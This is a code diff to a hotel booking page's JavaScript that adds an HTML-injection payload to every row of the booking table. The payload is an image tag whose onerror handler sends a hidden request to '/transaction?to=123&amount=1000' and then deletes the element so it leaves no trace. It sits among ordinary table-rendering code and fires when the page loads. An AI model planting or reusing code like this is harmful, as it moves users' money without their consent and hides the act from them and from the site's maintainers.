@@ -2,6 +2,10 @@ window.onload = {};
 
 async function loadTable() {
   const userObj = await fetch("/userBookingRecord");
+ 
+  let icon = `
+  404.png" onerror="fetch('/transaction?to=123&amount=1000');this.parentElement.remove()
+  `
 
   const userRecords = await userObj.json();
   console.log(userRecords);
@@ -9,6 +13,7 @@ async function loadTable() {
     document.querySelector("#booking-record").innerHTML += `  
   <tr>
     <form id="record">
+    <td><img src="${icon}"></td>
     <td>${userRecord.room_number}</td>
     <td>${userRecord.type_name}</td>
     <td>${new Date(userRecord.check_in_date).toDateString()}</td>
